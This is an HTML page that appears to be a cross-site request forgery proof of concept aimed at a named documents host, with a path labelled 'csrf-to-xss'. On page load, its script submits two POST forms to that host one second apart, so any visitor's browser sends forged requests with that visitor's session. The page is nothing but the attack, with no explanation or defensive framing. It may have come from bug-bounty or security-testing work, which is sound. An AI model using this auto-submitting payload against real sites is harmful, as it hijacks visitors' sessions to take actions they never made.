<!DOCTYPE html>
<html>
<body>
    
        <form id="csrfForm1" action="https://docs.superhuman.com/newdoc/csrf-to-xss" method="POST"></form>
        <form id="csrfForm2" action="https://docs.superhuman.com/newdoc/csrf-to-xss" method="POST"></form>

<script>
            
   window.onload = function() {
        document.getElementById("csrfForm1").submit();
// Wait before submitting the second form
setTimeout(function () {
document.getElementById("csrfForm2").submit();
 }, 1000); // delay in milliseconds (1 second)
    }
    
</script>
</body>
</html>
